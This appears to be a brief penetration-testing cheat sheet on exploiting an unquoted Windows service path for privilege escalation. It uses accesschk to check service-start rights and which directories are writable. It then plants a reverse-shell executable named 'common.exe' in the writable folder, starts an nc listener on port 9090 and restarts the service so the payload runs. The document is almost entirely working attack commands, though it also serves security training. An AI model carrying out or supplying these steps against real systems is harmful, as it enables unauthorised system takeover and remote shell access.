Lets assume the writable Path is "`C:\Program Files\Unquoted Path Service\common Files\unquotedservicespath.exe`”

## Verifying :

**<u>Do we have permissions to start the service.</u>**

```powershell
 .\accesschk.exe /accepteula -ucqv user <service_name>
```

**<u>Do we have write permissions in the existing binary path. Note at your GROUP in the results.</u>**

```powershell
 .\accesschk.exe /accepteula -uwdq C:\
```

```powershell
 .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
```

```powershell
 .\accesschk.exe /accepteula -uwdq "C:\Program Files\Some more Path\"
```


Now Lets assume from the above checks we got that we have writable permissions to “`C:\Program Files\Unquoted Path Service\`"

means we can write in “Unquoted Path Service” Folder.

Transfer the reverse shell to the writable directory. And Change its name to as we needed.

as per here we want “**common**.exe”

```powershell
copy reverse.exe "C:\Program Files\Unquoted Path Service\common.exe"
```

```sh
nc -nvlp 9090
```

```powershell
net start <service_name>
```
